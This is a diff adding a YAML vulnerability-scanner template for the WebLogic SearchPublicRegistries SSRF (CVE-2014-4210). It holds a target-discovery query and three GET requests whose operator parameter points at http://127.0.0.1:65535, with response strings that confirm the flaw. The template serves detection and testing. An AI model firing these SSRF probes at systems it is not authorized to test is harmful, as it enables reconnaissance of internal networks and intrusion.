@@ -1,0 +1,31 @@
+name: WebLogic SearchPublicRegistries SSRF(CVE-2014-4210)
+manual: true
+query: title="Search public registries" || port="7001" || body="Search public registries"
+  || app="Oracle-WeblogicPortal"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /uddiexplorer/SearchPublicRegistries.jsp?operator=http://127.0.0.1:65535&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search
+    expression: response.status == 200 && response.body.bcontains(b"but could not
+      connect over HTTP to server")
+  r1:
+    request:
+      method: GET
+      path: /uddiexplorer/SearchPublicRegistries.jsp?operator=http://127.0.0.1:65535&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search
+    expression: response.status == 200 && response.body.bcontains(b"returned a 404
+      error code")
+  r2:
+    request:
+      method: GET
+      path: /uddiexplorer/SearchPublicRegistries.jsp?operator=http://127.0.0.1:65535&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search
+    expression: response.status == 200 && response.body.bcontains(b"did not have a
+      valid  SOAP content-type")
+expression: r0() || r1() || r2()
+detail:
+  author: 1749115565@qq.com
+  links:
+  - https://www.cnblogs.com/bmjoker/p/9759761.html
+  - https://github.com/NHPT/WebLogic-SSRF_CVE-2014-4210
+  description: Weblogic SearchPublicRegistries SSRF(CVE-2014-4210)
